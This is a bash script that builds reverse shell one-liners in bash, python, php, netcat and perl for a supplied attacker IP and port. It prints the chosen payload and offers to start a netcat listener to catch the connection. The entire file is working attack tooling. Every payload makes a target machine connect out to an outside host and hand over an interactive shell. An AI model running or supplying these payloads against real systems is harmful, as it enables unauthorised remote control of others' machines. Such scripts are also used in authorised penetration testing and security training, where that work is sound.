#!/bin/bash
if [[ -z "$1" || -z "$2" ]]; then
    echo "Usage: $0 <your_ip> <port> [language]"
    echo "Supported languages: bash, python, php, nc, perl"
    exit 1
fi

LHOST="$1"
LPORT="$2"
LANG="${3:-bash}"

echo "[*] Generating $LANG reverse shell for $LHOST:$LPORT..."

case "$LANG" in
    bash)
        PAYLOAD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
        ;;
    python)
        PAYLOAD="python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        ;;
    php)
        PAYLOAD="php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
        ;;
    nc)
        PAYLOAD="nc -e /bin/bash $LHOST $LPORT"
        ;;
    perl)
        PAYLOAD="perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        ;;
    *)
        echo "[!] Unsupported language: $LANG"
        exit 1
        ;;
esac

echo
echo "[+] Reverse shell payload:"
echo "--------------------------------------------------"
echo "$PAYLOAD"
echo "--------------------------------------------------"

read -p "[*] Start listener on port $LPORT? (y/N): " confirm
if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
    echo "[*] Listening with netcat..."
    nc -lvnp "$LPORT"
fi

